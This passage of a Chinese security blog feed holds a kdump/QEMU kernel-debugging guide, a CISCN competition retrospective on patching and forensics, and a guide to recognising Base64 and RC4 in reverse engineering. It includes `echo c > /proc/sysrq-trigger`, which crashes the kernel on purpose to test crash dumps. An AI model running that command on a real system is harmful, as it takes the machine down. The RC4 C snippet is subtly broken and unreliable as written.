class="line">libpcre3/focal-updates,focal-security,now 2:8.39-12ubuntu0.1 amd64 [installed]</span><br><span class="line">libperl5.30/focal-updates,focal-security,now 5.30.0-9ubuntu0.5 amd64 [installed,automatic]</span><br><span class="line">libpng16-16/focal,now 1.6.37-2 amd64 [installed,automatic]</span><br><span class="line">libprocps8/focal-updates,focal-security,now 2:3.3.16-1ubuntu2.4 amd64 [installed]</span><br><span class="line">libpython3-stdlib/focal,now 3.8.2-0ubuntu2 amd64 [installed,automatic]</span><br><span class="line">libpython3.8-minimal/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">libpython3.8-stdlib/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">libpython3.8/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">libreadline8/focal,now 8.0-4 amd64 [installed,automatic]</span><br><span class="line">libseccomp2/focal-updates,focal-security,now 2.5.1-1ubuntu1~20.04.2 amd64 [installed]</span><br><span class="line">libselinux1/focal,now 3.0-1build2 amd64 [installed]</span><br><span class="line">libsemanage-common/focal,now 3.0-1build2 all [installed]</span><br><span class="line">libsemanage1/focal,now 3.0-1build2 amd64 [installed]</span><br><span class="line">libsepol1/focal-updates,focal-security,now 3.0-1ubuntu0.1 amd64 [installed]</span><br><span class="line">libsmartcols1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libsnappy1v5/focal,now 1.1.8-1build1 amd64 [installed,automatic]</span><br><span class="line">libsqlite3-0/focal-updates,focal-security,now 3.31.1-4ubuntu0.6 amd64 [installed,automatic]</span><br><span class="line">libss2/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">libssl1.1/focal-updates,focal-security,now 1.1.1f-1ubuntu2.24 amd64 [installed,automatic]</span><br><span class="line">libstdc++6/focal-updates,focal-security,now 10.5.0-1ubuntu1~20.04 amd64 [installed]</span><br><span class="line">libsystemd0/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed]</span><br><span class="line">libtasn1-6/focal-updates,focal-security,now 4.16.0-2ubuntu0.1 amd64 [installed]</span><br><span class="line">libtdb1/focal-updates,focal-security,now 1.4.5-0ubuntu0.20.04.1 amd64 [installed,automatic]</span><br><span class="line">libtinfo6/focal-updates,focal-security,now 6.2-0ubuntu2.1 amd64 [installed]</span><br><span class="line">libudev1/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed]</span><br><span class="line">libunistring2/focal,now 0.9.10-2 amd64 [installed]</span><br><span class="line">libuuid1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libvorbis0a/focal,now 1.3.6-2ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libvorbisfile3/focal,now 1.3.6-2ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libxml2/focal-updates,focal-security,now 2.9.10+dfsg-5ubuntu0.20.04.9 amd64 [installed,automatic]</span><br><span class="line">libzstd1/focal-updates,focal-security,now 1.4.4+dfsg-3ubuntu0.1 amd64 [installed]</span><br><span class="line">linux-base/focal-updates,now 4.5ubuntu3.7 all [installed,automatic]</span><br><span class="line">linux-crashdump/focal-updates,focal-security,now 5.4.0.208.204 amd64 [installed]</span><br><span class="line">linux-image-5.4.0-1127-kvm/focal-updates,focal-security,now 5.4.0-1127.136 amd64 [installed,automatic]</span><br><span class="line">linux-modules-5.4.0-1127-kvm/focal-updates,focal-security,now 5.4.0-1127.136 amd64 [installed,automatic]</span><br><span class="line">locales/focal-updates,focal-security,now 2.31-0ubuntu9.17 all [installed]</span><br><span class="line">login/focal-updates,focal-security,now 1:4.8.1-1ubuntu5.20.04.5 amd64 [installed]</span><br><span class="line">logsave/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">lsb-base/focal,now 11.1.0ubuntu2 all [installed]</span><br><span class="line">lsb-release/focal,now 11.1.0ubuntu2 all [installed,automatic]</span><br><span class="line">lz4/focal-updates,focal-security,now 1.9.2-2ubuntu0.20.04.1 amd64 [installed,automatic]</span><br><span class="line">makedumpfile/focal-updates,now 1:1.6.7-1ubuntu2.5 amd64 [installed,automatic]</span><br><span class="line">mawk/focal,now 1.3.4.20200120-2 amd64 [installed]</span><br><span class="line">mime-support/focal,now 3.64ubuntu1 all [installed,automatic]</span><br><span class="line">mount/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">ncurses-base/focal-updates,focal-security,now 6.2-0ubuntu2.1 all [installed]</span><br><span class="line">ncurses-bin/focal-updates,focal-security,now 6.2-0ubuntu2.1 amd64 [installed]</span><br><span class="line">netbase/focal,now 6.1 all [installed,automatic]</span><br><span class="line">networkd-dispatcher/focal-updates,focal-security,now 2.1-2~ubuntu20.04.3 all [installed,automatic]</span><br><span class="line">openssl/focal-updates,focal-security,now 1.1.1f-1ubuntu2.24 amd64 [installed,automatic]</span><br><span class="line">os-prober/focal,now 1.74ubuntu2 amd64 [installed,automatic]</span><br><span class="line">passwd/focal-updates,focal-security,now 1:4.8.1-1ubuntu5.20.04.5 amd64 [installed]</span><br><span class="line">perl-base/focal-updates,focal-security,now 5.30.0-9ubuntu0.5 amd64 [installed]</span><br><span class="line">perl-modules-5.30/focal-updates,focal-security,now 5.30.0-9ubuntu0.5 all [installed,automatic]</span><br><span class="line">perl/focal-updates,focal-security,now 5.30.0-9ubuntu0.5 amd64 [installed,automatic]</span><br><span class="line">procps/focal-updates,focal-security,now 2:3.3.16-1ubuntu2.4 amd64 [installed]</span><br><span class="line">python-apt-common/focal-updates,now 2.0.1ubuntu0.20.04.1 all [installed,automatic]</span><br><span class="line">python3-apport/focal-updates,now 2.20.11-0ubuntu27.27 all [installed,automatic]</span><br><span class="line">python3-apt/focal-updates,now 2.0.1ubuntu0.20.04.1 amd64 [installed,automatic]</span><br><span class="line">python3-blinker/focal,now 1.4+dfsg1-0.3ubuntu1 all [installed,automatic]</span><br><span class="line">python3-certifi/focal,now 2019.11.28-1 all [installed,automatic]</span><br><span class="line">python3-cffi-backend/focal,now 1.14.0-1build1 amd64 [installed,automatic]</span><br><span class="line">python3-chardet/focal,now 3.0.4-4build1 all [installed,automatic]</span><br><span class="line">python3-cryptography/focal-updates,focal-security,now 2.8-3ubuntu0.3 amd64 [installed,automatic]</span><br><span class="line">python3-dbus/focal,now 1.2.16-1build1 amd64 [installed,automatic]</span><br><span class="line">python3-distro/focal,now 1.4.0-1 all [installed,automatic]</span><br><span class="line">python3-entrypoints/focal,now 0.3-2ubuntu1 all [installed,automatic]</span><br><span class="line">python3-gi/focal,now 3.36.0-1 amd64 [installed,automatic]</span><br><span class="line">python3-httplib2/focal,now 0.14.0-1ubuntu1 all [installed,automatic]</span><br><span class="line">python3-idna/focal-updates,focal-security,now 2.8-1ubuntu0.1 all [installed,automatic]</span><br><span class="line">python3-jwt/focal-updates,focal-security,now 1.7.1-2ubuntu2.1 all [installed,automatic]</span><br><span class="line">python3-keyring/focal,now 18.0.1-2ubuntu1 all [installed,automatic]</span><br><span class="line">python3-launchpadlib/focal,now 1.10.13-1 all [installed,automatic]</span><br><span class="line">python3-lazr.restfulclient/focal,now 0.14.2-2build1 all [installed,automatic]</span><br><span class="line">python3-lazr.uri/focal,now 1.0.3-4build1 all [installed,automatic]</span><br><span class="line">python3-minimal/focal,now 3.8.2-0ubuntu2 amd64 [installed,automatic]</span><br><span class="line">python3-oauthlib/focal,now 3.1.0-1ubuntu2 all [installed,automatic]</span><br><span class="line">python3-pkg-resources/focal-updates,focal-security,now 45.2.0-1ubuntu0.2 all [installed,automatic]</span><br><span class="line">python3-problem-report/focal-updates,now 2.20.11-0ubuntu27.27 all [installed,automatic]</span><br><span class="line">python3-requests-unixsocket/focal,now 0.2.0-2 all [installed,automatic]</span><br><span class="line">python3-requests/focal-updates,focal-security,now 2.22.0-2ubuntu1.1 all [installed,automatic]</span><br><span class="line">python3-secretstorage/focal,now 2.3.1-2ubuntu1 all [installed,automatic]</span><br><span class="line">python3-simplejson/focal,now 3.16.0-2ubuntu2 amd64 [installed,automatic]</span><br><span class="line">python3-six/focal,now 1.14.0-2 all [installed,automatic]</span><br><span class="line">python3-systemd/focal,now 234-3build2 amd64 [installed,automatic]</span><br><span class="line">python3-urllib3/focal-updates,focal-security,now 1.25.8-2ubuntu0.4 all [installed,automatic]</span><br><span class="line">python3-wadllib/focal,now 1.3.3-3build1 all [installed,automatic]</span><br><span class="line">python3.8-minimal/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">python3.8/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">python3/focal,now 3.8.2-0ubuntu2 amd64 [installed,automatic]</span><br><span class="line">readline-common/focal,now 8.0-4 all [installed,automatic]</span><br><span class="line">sed/focal,now 4.7-1 amd64 [installed]</span><br><span class="line">sensible-utils/focal,now 0.0.12+nmu1 all [installed]</span><br><span class="line">shared-mime-info/focal,now 1.15-1 amd64 [installed,automatic]</span><br><span class="line">sound-theme-freedesktop/focal,now 0.8-2ubuntu1 all [installed,automatic]</span><br><span class="line">systemd-sysv/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">systemd-timesyncd/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">systemd/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed]</span><br><span class="line">sysvinit-utils/focal,now 2.96-2.1ubuntu1 amd64 [installed]</span><br><span class="line">tar/focal-updates,focal-security,now 1.30+dfsg-7ubuntu0.20.04.4 amd64 [installed]</span><br><span class="line">tzdata/focal-updates,focal-security,now 2024b-0ubuntu0.20.04.1 all [installed,automatic]</span><br><span class="line">ubuntu-keyring/focal-updates,now 2020.02.11.4 all [installed]</span><br><span class="line">ucf/focal,now 3.0038+nmu1 all [installed,automatic]</span><br><span class="line">udev/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">util-linux/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">vim-common/focal-updates,focal-security,now 2:8.1.2269-1ubuntu5.31 all [installed,automatic]</span><br><span class="line">vim-runtime/focal-updates,focal-security,now 2:8.1.2269-1ubuntu5.31 all [installed,automatic]</span><br><span class="line">vim/focal-updates,focal-security,now 2:8.1.2269-1ubuntu5.31 amd64 [installed]</span><br><span class="line">xdg-user-dirs/focal,now 0.17-2ubuntu1 amd64 [installed,automatic]</span><br><span class="line">xxd/focal-updates,focal-security,now 2:8.1.2269-1ubuntu5.31 amd64 [installed,automatic]</span><br><span class="line">xz-utils/focal-updates,focal-security,now 5.2.4-1ubuntu1.1 amd64 [installed,automatic]</span><br><span class="line">zlib1g/focal-updates,focal-security,now 1:1.2.11.dfsg-2ubuntu1.5 amd64 [installed]</span><br></pre></td></tr></table></figure><h1>3. kdump</h1><p>umount后qemu启动进去。我的qemu的启动脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -m 1G\</span><br><span class="line">-append &quot;nokaslr console=ttyS0 root=/dev/sda earlyprintk=serial rw loglevel=8 crashkernel=256M&quot; \</span><br><span class="line">-kernel linux-6.13.7/arch/x86/boot/bzImage \</span><br><span class="line">    -drive file=newrootfs.img,format=raw \</span><br><span class="line">-nographic \</span><br><span class="line">    -smp 1 \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -netdev user,id=mynic0 -device e1000,netdev=mynic0,mac=52:54:98:76:54:32 \</span><br><span class="line">    -pidfile vm.pid \</span><br><span class="line">    2&gt;&amp;1 | tee vm.log</span><br></pre></td></tr></table></figure><p>其中，kexec要想运行，内核参数需要传入crashkernel。同时要提供rw参数让系统能够写入镜像。如果一切顺利，你这时会在systemd的启动日志中看到kdump相关的输出，当然这里我们还没有配置所以应该是失败。</p><p>kdump默认会从<code>/var/lib/kdump</code>目录下面查找initrd和vmlinuz符号链接，我们用qemu起的内核当然是没有的。其配置文件位于<code>/etc/default/kdump-tools</code>，只需要编辑这个文件修改路径即可。刚刚chroot的时候copy内核vmlinuz和initrd进去，并在配置文件中指明他们的路径。你也可以配置自己的makedumpfile和kexec参数。</p><p>kdump提供了命令<code>kdump-config</code>，用status或者show可以看到一些信息。如果是ready to kdump，那么就可以尝试用<code>echo c &gt; /proc/sysrq-trigger</code>触发内核崩溃了。在我用的ubuntubase上这个默认是开启的，如果没有开启可以自行查找开启方法，写一个1就行。一切顺利的话，kdump会自动触发内核重启，并在/var/crash下留下一个以时间命名的文件夹，里面包含有dmesg和压缩后的内核的内存转储（默认是只保留内核空间正在使用的页框）。然后用crash选定带调试信息的内核（也就是qemu启动参数指定的内核，选根目录的vmlinux），就可以查看转储分析了。</p><h1>总结</h1><p>这次从0开始，相当于是借助qemu从0搭了个linux机器。中间遇到各种各样的问题，包括systemd的服务报错，机器关不了，崩溃了不重启，停在initramfs进不去，vmcore有了分析不了一直报错等等…留个归档</p><h1>后续</h1><p>内部无法上网，解决了。首先apt安装<code>netplan.io</code>后创建/etc/netplan/01-netcfg.yaml：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">network:</span></span><br><span class="line">  <span class="attr">version:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">renderer:</span> <span class="string">networkd</span> <span class="comment"># 或者 networkmanager 如果你安装并使用它</span></span><br><span class="line">  <span class="attr">ethernets:</span></span><br><span class="line">    <span class="attr">enp0s3:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">true</span></span><br><span class="line">      <span class="comment"># 可选: 如果 IPv6 也需要 DHCP</span></span><br><span class="line">      <span class="comment"># dhcp6: true</span></span><br></pre></td></tr></table></figure><p>然后执行<code>netplan apply</code>就可以了。resolv.conf的配置就不赘述了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;OS比赛的环境搭建折磨了我两天，因此有必要在这里记录下全过程，以后自己想用什么系统也会方便一点。而且网上的blog对于坑是只字不提啊我日。&lt;/p&gt;
&lt;p&gt;目前能够完美运行kdump的环境，基于：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;</summary>
      
    
    
    
    <category term="kernel" scheme="https://zjw1nd.github.io/categories/kernel/"/>
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/tags/linux/"/>
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
    <category term="kdump" scheme="https://zjw1nd.github.io/tags/kdump/"/>
    
  </entry>
  
  <entry>
    <title>2025ciscnccb复盘小记</title>
    <link href="https://zjw1nd.github.io/2025/03/17/2025ciscnccb%E5%A4%8D%E7%9B%98%E5%B0%8F%E8%AE%B0/"/>
    <id>https://zjw1nd.github.io/2025/03/17/2025ciscnccb%E5%A4%8D%E7%9B%98%E5%B0%8F%E8%AE%B0/</id>
    <published>2025-03-17T14:28:55.000Z</published>
    <updated>2025-07-23T09:08:35.394Z</updated>
    
    <content type="html"><![CDATA[<p>虽然失败了但是还是简单记录下遇到的问题</p><h1>awdp</h1><p>首先，这是最无语的环节，等过几天选手的blog可能会有wp研究下，最简单的题目10次用完了都一直操作失败是真的不懂。整个程序只有add，edit和delete。delete虽然没有UAF但是谨慎起见我也把free nop了。而add则不允许输入，只有一个idx。</p><p>edit里存在漏洞，snprintf他迷惑人，将fmt和实际read的0x100两个参数对调了一下，看着没问题，实际上VulFi一扫或者鼠标放上去看一下函数原型就知道了，把这个修了，没过。后面的输入环节也不会溢出，大小全是无符号check，size独立放在chunk内部。</p><p>我承认中间浪费了很多机会（虽然不知道具体原因），猜测可能是和本地patchelf了libc路径有关，<a href="http://xn--update-957i43fj1g26gzsx1fvmljh3cyy5auo8e.sh">也可能是没有按例子写update.sh</a>（用的bash而非sh），还有几次是发现ida抽风了patch写入没写进去，还是gdb动调发现和ida不一样才知道的。但是最后几次应该没有其他问题了才对。</p><p>另外最后看了下一个protobuf的题。你妈的国赛内部怀疑有人天天用这神人protobuf开发，从23年到现在，从初赛到决赛，到处塞这protobuf。虽然当时复现研究过但是最后时间不够了，而且我linux上没有protobuf环境，气笑了。看了下结构体也是个勾八菜单堆，用类似虚拟机/vtable的形式进行调用，找了下输入，把memcpy劫持到ehframe上自己实现的memcpy，即调用之前永远对rdx置零。试了下不出所料的操作失败了，prctl通防当然也不行，于是遗憾离场。</p><h1>isw</h1><p>渗透当然是不懂就不谈了，重点谈谈应急响应。没有找对取证工具真的太亏了。</p><p>首先一个，抓ip是叶大师ssh上去之后tcpdump看到的ip，但是没显示进程id或者路径（结果到最后都没找到程序…）。然后010直接打开镜像搜ip，结果直接搜到了程序，后面就一直想办法把这个拖出来。</p><p>但是往前找到最近的ELF之后ida打不开，还是莫名其妙只有叶大师的ida能打开不烂…从里面翻了点信息md5交了几个flag。</p><p>AutoPsy一直在虚拟机里跑这个镜像，又慢又卡。换了一个，Magnet AXIOM，也是虚拟机里一下就好了，而且sudo的内容会存到auth.log里面，直接审内核日志就能复原当时命令执行的情况，包括文件名字什么的，真的sb啊，选择远大于努力这一块。</p><p>或许有取证大师会好一点？</p><h1>wp</h1><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&amp;mid=2247487308&amp;idx=1&amp;sn=58ded47969223626e9937b5ccf93d3a8&amp;chksm=cef98a3b1b7ee9a0deeb2746fb95e0bd6fb6e0d7adf55a9902ee121c3e7533efcde91d9498fc&amp;mpshare=1&amp;scene=23&amp;srcid=0318w22pdH0PdB7Tj2Cbw5B0&amp;sharer_shareinfo=a714674b8023b181d0876977bde50035&amp;sharer_shareinfo_first=a714674b8023b181d0876977bde50035#rd">Here</a></p><p>很难评，某种意义上这个patch也是对脑洞的过程。至今我也不知道它会check什么，疑似会检查符号。</p><h1>最后</h1><ul class="lvl-0"><li class="lvl-2"><p>protobuf这玩意似乎只有国赛一直在搞…，配个环境熟悉下</p></li><li class="lvl-2"><p>应急响应这块还是少点经验，之前学长发过windows应急响应手册，早知道赛前发应急响应附件之后就去看下linux的了，比赛结束才想起来。</p></li><li class="lvl-2"><p>patch的还是太激进了，但是题目确实一坨，snprintf栈上格式化为什么没有exp打…还有哪里来的堆溢出，snprintf参数写反了真的没人发现吗…</p></li><li class="lvl-2"><p>累了，队里的web手也被反直觉patch恶心了，包括扫git用的工具有问题扫不出来，给的附件是www结果patch要放到www/html下…4h超级过载已经管不了了</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虽然失败了但是还是简单记录下遇到的问题&lt;/p&gt;
&lt;h1&gt;awdp&lt;/h1&gt;
&lt;p&gt;首先，这是最无语的环节，等过几天选手的blog可能会有wp研究下，最简单的题目10次用完了都一直操作失败是真的不懂。整个程序只有add，edit和delete。delete虽然没有UAF但是谨</summary>
      
    
    
    
    <category term="WP" scheme="https://zjw1nd.github.io/categories/WP/"/>
    
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>常见的加密编码算法逆向识别</title>
    <link href="https://zjw1nd.github.io/2025/03/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E8%AF%86%E5%88%AB/"/>
    <id>https://zjw1nd.github.io/2025/03/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E8%AF%86%E5%88%AB/</id>
    <published>2025-03-12T02:07:48.000Z</published>
    <updated>2025-04-25T08:55:33.548Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考自 <a href="https://www.cnblogs.com/Moomin/p/15004170.html#aes">https://www.cnblogs.com/Moomin/p/15004170.html#aes</a></p></blockquote><h1>Base64</h1><h2 id="识别">识别</h2><p>一个索引串<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code></p><h2 id="IO">IO</h2><p>可能做魔改调整, 6位索引一个ascii码的索引换掉，此时我们用bytes.maketrans方法定义一个转换函数即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">encoded_data = base64.b64encode(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">decoded_data = base64.b64decode(encoded_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 魔改：</span></span><br><span class="line">custom_alphabet = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">custom_b64encode_table = <span class="built_in">bytes</span>.maketrans(</span><br><span class="line">    <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>,</span><br><span class="line">    custom_alphabet.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">)</span><br><span class="line">custom_b64decode_table = <span class="built_in">bytes</span>.maketrans(</span><br><span class="line">    custom_alphabet.encode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">    <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_b64encode</span>(<span class="params">data</span>):</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    <span class="keyword">return</span> encoded.translate(custom_b64encode_table)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_b64decode</span>(<span class="params">data</span>):</span><br><span class="line">    translated = data.translate(custom_b64decode_table)</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(translated)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用自定义索引表进行编码</span></span><br><span class="line">encoded_data = custom_b64encode(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">decoded_data = custom_b64decode(encoded_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h1>RC4</h1><h2 id="识别-2">识别</h2><p>对称，流加密，2个核心，初始化S盒，加密和解密是对称的。识别方式主要是看一个256次的for循环，尤其是s盒初始化函数，其对256字节的数组按照下标从0开始赋值，这一特征比较明显。</p><p>其他特征可以参考下面的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*初始化函数*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s,<span class="type">unsigned</span> <span class="type">char</span>*key,<span class="type">unsigned</span> <span class="type">long</span> Len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//char k[256]=&#123;0&#125;;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i]=i;</span><br><span class="line">        k[i]=key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*加解密*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s,<span class="type">unsigned</span> <span class="type">char</span>*Data,<span class="type">unsigned</span> Long Len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,t=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++)&#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k]^=s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IO-2">IO</h2><p>需求crypto模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个随机密钥</span></span><br><span class="line">key = get_random_bytes(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化RC4加密器</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密数据</span></span><br><span class="line">data = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">encrypted_data = cipher.encrypt(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encrypted: <span class="subst">&#123;encrypted_data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化RC4解密器</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密数据</span></span><br><span class="line">decrypted_data = cipher.decrypt(encrypted_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted: <span class="subst">&#123;decrypted_data&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>注意的是，rc4是一个流加密算法，每次初始化只能获得一个固定的加密器，即new一次之后，后续调用encrypt时会一直“继续”当前的加密，即假设几次需要加密的明文是连续的。如果题目中的rc4每次调用都走了一遍初始化流程，则io也需要对应的每次都new一个新的加密器——即使密钥没有发生变化。</p><p>另外，rc4作为对称加密，加解密算法是一样的。</p><h1>RC2/RC5/RC6</h1><p>没有那么常用就放在一起</p><h2 id="识别-3">识别</h2><h3 id="RC2">RC2</h3><p>64位分组加密，变长密钥，除了加解密还有密钥扩展算法。加密过程如下，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 